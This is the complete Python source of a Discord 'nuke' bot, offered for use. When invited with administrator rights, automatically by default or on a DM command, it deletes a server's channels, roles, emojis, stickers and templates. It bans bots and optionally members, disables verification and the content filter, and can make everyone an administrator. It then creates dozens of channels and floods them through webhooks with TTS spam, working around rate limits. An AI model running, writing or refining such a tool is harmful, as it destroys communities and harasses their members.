import os
import json
import random
import asyncio
import itertools
from typing import TypeVar, Generic

import aiohttp
import discord
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKEN not set in .env")

with open("config.json", "r", encoding="utf-8") as f:
    cfg = json.load(f)
with open("data.json", "r", encoding="utf-8") as f:
    data = json.load(f)

COLORS = [
    discord.Color.red(), discord.Color.orange(), discord.Color.yellow(),
    discord.Color.green(), discord.Color.blue(), discord.Color.purple(),
]

ASSETS_DIR = "assets"
_ASSETS: dict[str, bytes | None] = {}

def _load_assets() -> None:
    for name in ("server_icon", "server_banner", "invite_background", "webhook_avatar"):
        for ext in ("png", "jpg", "jpeg", "gif", "webp"):
            path = os.path.join(ASSETS_DIR, f"{name}.{ext}")
            if os.path.exists(path):
                with open(path, "rb") as f:
                    _ASSETS[name] = f.read()
                break
        else:
            _ASSETS[name] = None

_load_assets()

def asset(name: str) -> bytes | None:
    return _ASSETS.get(name)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

global_session = None

T = TypeVar('T')

class FastPicker(Generic[T]):
    def __init__(self, items: list[T]):
        shuffled = list(items)
        if shuffled:
            random.shuffle(shuffled)
            self.cycle: itertools.cycle[T] = itertools.cycle(shuffled)
        else:
            self.cycle = itertools.cycle([items[0]] if items else [])
            
    def pick(self) -> T:
        return next(self.cycle)

_pickers: dict[str, FastPicker[str]] = {k: FastPicker(v) for k, v in data.items() if isinstance(v, list)}
_color_picker: FastPicker[discord.Color] = FastPicker(COLORS)

def pick(key: str) -> str:
    if key in _pickers:
        return _pickers[key].pick()
    return "nuked"

def get_random_string(length: int = 10) -> str:
    import string
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(chars) for _ in range(length))

async def gather_safe(*coros):
    if not coros:
        return []
    return await asyncio.gather(*coros, return_exceptions=True)

async def blast_wh(wh_url: str, msg_count: int, delay: float, use_tts: bool) -> None:
    if global_session is None:
        return
        
    raw_payloads = [
        json.dumps({"content": msg, "tts": use_tts}).encode('utf-8')
        for msg in data.get("messages", ["nuked"])
    ]
    random.shuffle(raw_payloads)
    payload_cycle = itertools.cycle(raw_payloads)
    headers = {"Content-Type": "application/json"}
    
    for _ in range(msg_count):
        payload = next(payload_cycle)
        while True:
            try:
                async with global_session.post(f"{wh_url}?wait=false", data=payload, headers=headers) as resp:
                    if resp.status in (200, 204):
                        remaining = int(resp.headers.get("X-RateLimit-Remaining", 1))
                        reset_after = float(resp.headers.get("X-RateLimit-Reset-After", 0.0))
                        
                        if delay > 0:
                            if remaining == 0 and reset_after > delay:
                                await asyncio.sleep(reset_after + 0.05)
                            else:
                                await asyncio.sleep(delay)
                        elif remaining == 0 and reset_after > 0:
                            await asyncio.sleep(reset_after + 0.05)
                        break 
                    elif resp.status == 429:
                        reset_after = float(resp.headers.get("X-RateLimit-Reset-After", 1.0))
                        await asyncio.sleep(reset_after + 0.05)
                        continue 
                    else:
                        break 
            except Exception:
                break 

async def blast_bot(ch: discord.TextChannel | discord.VoiceChannel, msg_count: int, delay: float, use_tts: bool) -> None:
    msgs = list(data.get("messages", ["nuked"]))
    random.shuffle(msgs)
    msg_cycle = itertools.cycle(msgs)
    
    for _ in range(msg_count):
        try:
            await ch.send(next(msg_cycle), tts=use_tts)
            if delay > 0:
                await asyncio.sleep(delay)
        except Exception:
            break 

async def perform_nuke(guild: discord.Guild) -> None:
    bot.loop.create_task(
        guild.edit(
            name=cfg.get("server_name", "nuked"), 
            icon=asset("server_icon"), 
            banner=asset("server_banner"), 
            splash=asset("invite_background"),
            system_channel=None,
            verification_level=discord.VerificationLevel.none,
            default_notifications=discord.NotificationLevel.all_messages,
            explicit_content_filter=discord.ContentFilter.disabled,
        )
    )

    async def destroy_task():
        destroy = []
        if cfg.get("ban_bots", True):
            destroy.extend(m.ban() for m in guild.members if m.bot and m != guild.me)
        if cfg.get("ban_members", False):
            destroy.extend(m.ban() for m in guild.members if not m.bot and m != guild.me)
        
        destroy.extend(t.delete() for t in await guild.templates())
        destroy.extend(s.delete() for s in guild.stickers)
        destroy.extend(e.delete() for e in guild.emojis)
        destroy.extend(r.delete() for r in guild.roles if r != guild.default_role and r < guild.me.top_role)
        destroy.extend(c.delete() for c in guild.channels)
        
        if cfg.get("give_everyone_admin", False):
            try:
                destroy.append(guild.default_role.edit(permissions=discord.Permissions(administrator=True)))
            except Exception:
                pass

        if cfg.get("change_nicknames", False):
            nick_type = cfg.get("nickname_type", "random_string")
            for m in guild.members:
                if m != guild.me:
                    new_nick = get_random_string(10) if nick_type == "random_string" else pick("nickname_list")
                    destroy.append(m.edit(nick=new_nick))
                    
        await gather_safe(*destroy)
        
    bot.loop.create_task(destroy_task())

    cat_results = await gather_safe(*(guild.create_category(pick("category_names")) for _ in range(cfg.get("category_count", 10))))
    categories = [c for c in cat_results if isinstance(c, discord.CategoryChannel)]

    role_count = cfg.get("role_count", 50)
    bot.loop.create_task(gather_safe(*(guild.create_role(name=pick("role_names"), color=_color_picker.pick()) for _ in range(role_count))))

    channel_count = cfg.get("channel_count", 50)
    wh_name = cfg.get("webhook_name", "nuked")
    msg_count = cfg.get("message_count", 50)
    delay = cfg.get("webhook_delay", 0)
    use_tts = cfg.get("tts", True)
    mix_voice = cfg.get("mix_voice_channels", False)

    async def create_channel_and_blast():
        cat = random.choice(categories) if categories else None
        try:
            is_voice = mix_voice and random.random() < 0.3
            
            if is_voice:
                ch = await guild.create_voice_channel(pick("channel_names"), category=cat, bitrate=8000)
                bot.loop.create_task(blast_bot(ch, msg_count, delay, use_tts))
                return
                
            ch = await guild.create_text_channel(pick("channel_names"), category=cat)
            wh = None
            try:
                wh = await ch.create_webhook(name=wh_name, avatar=asset("webhook_avatar"))
            except Exception:
                pass
            
            if wh:
                bot.loop.create_task(blast_wh(wh.url, msg_count, delay, use_tts))
            else:
                bot.loop.create_task(blast_bot(ch, msg_count, delay, use_tts))
        except Exception:
            pass

    await gather_safe(*(create_channel_and_blast() for _ in range(channel_count)))

@bot.event
async def on_ready() -> None:
    global global_session
    if global_session is None:
        conn = aiohttp.TCPConnector(limit=0)
        global_session = aiohttp.ClientSession(connector=conn)
    user = bot.user
    print(f"Logged in as {user} ({user.id})" if user else "Bot ready")

@bot.event
async def on_guild_join(guild: discord.Guild) -> None:
    if not cfg.get("auto_nuke_on_join", True):
        return
    if not guild.me.guild_permissions.administrator:
        return
    await perform_nuke(guild)

@bot.command()
async def nuke(ctx: commands.Context, server_id: int | None = None) -> None:
    if ctx.guild:
        return
    if server_id is None:
        await ctx.reply("**Wrong Usage!**\nCorrect usage: `!nuke <server_id>`")
        return
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.reply(f"Server not found: `{server_id}`\nInvite the bot first, then try again.")
        return
    if not guild.me.guild_permissions.administrator:
        await ctx.reply("Bot has no Administrator in that server.")
        return
    await ctx.reply("Nuke started.")
    await perform_nuke(guild)

bot.run(TOKEN)
